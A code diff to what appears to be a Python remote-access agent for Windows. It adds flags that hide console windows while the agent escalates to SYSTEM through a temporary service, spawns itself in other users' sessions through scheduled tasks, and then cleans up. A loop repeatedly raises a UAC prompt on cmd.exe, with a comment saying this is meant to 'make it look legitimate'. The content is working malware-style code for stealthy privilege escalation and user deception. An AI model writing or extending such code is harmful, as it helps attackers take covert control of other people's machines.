@@ -434,17 +434,20 @@ else:
     start_svc = ['sc', 'start', service_name]
     delete_svc = ['sc', 'delete', service_name]
     
+    # Flags to hide console windows
+    CREATE_NO_WINDOW = 0x08000000
+    
     try:
         # 1. Create service
-        cp = subprocess.run(create_svc, capture_output=True, text=True)
+        cp = subprocess.run(create_svc, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
         if cp.returncode != 0:
             result = f"Error creating service: {{cp.stderr}}"
         else:
             # 2. Start service
-            subprocess.run(start_svc, capture_output=True)
+            subprocess.run(start_svc, capture_output=True, creationflags=CREATE_NO_WINDOW)
             time.sleep(2)
             # 3. Cleanup
-            subprocess.run(delete_svc, capture_output=True)
+            subprocess.run(delete_svc, capture_output=True, creationflags=CREATE_NO_WINDOW)
             result = 'Success: NT AUTHORITY/SYSTEM agent spawn command sent.'
     except Exception as e:
         result = f'Error during elevation: {{str(e)}}'
@@ -499,19 +502,22 @@ else:
         run_task = ['schtasks', '/run', '/tn', task_name]
         delete_task = ['schtasks', '/delete', '/tn', task_name, '/f']
         
+        # Flags to hide console windows
+        CREATE_NO_WINDOW = 0x08000000
+        
         # 1. Create task
-        cp = subprocess.run(create_task, capture_output=True, text=True)
+        cp = subprocess.run(create_task, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
         if cp.returncode != 0:
             result = "Error creating task for " + target + ": " + cp.stderr
         else:
             # 2. Run task
-            rp = subprocess.run(run_task, capture_output=True, text=True)
+            rp = subprocess.run(run_task, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
             if rp.returncode != 0:
                 result = "Error running task for " + target + ": " + rp.stderr
             else:
                 time.sleep(2)
                 # 3. Cleanup (Disabled for debugging)
-                # subprocess.run(delete_task, capture_output=True)
+                # subprocess.run(delete_task, capture_output=True, creationflags=CREATE_NO_WINDOW)
                 # try: os.remove(log_path)
                 # except: pass
                 result = 'Success: Agent spawn command sent for user ' + target + '. (File: ' + log_path + ' left for debugging)'
@@ -547,7 +553,7 @@ def uac_loop():
     if not os.path.exists(pyw): pyw = sys.executable
     
     # We trigger UAC on cmd.exe to make it look legitimate
-    # params: /c "path\to\pythonw.exe" -c "agent_code"
+    # params: /c "path\\to\\pythonw.exe" -c "agent_code"
     params = f'/c ""{{pyw}}" -c "{{agent_cmd}}""'
     
     while True:
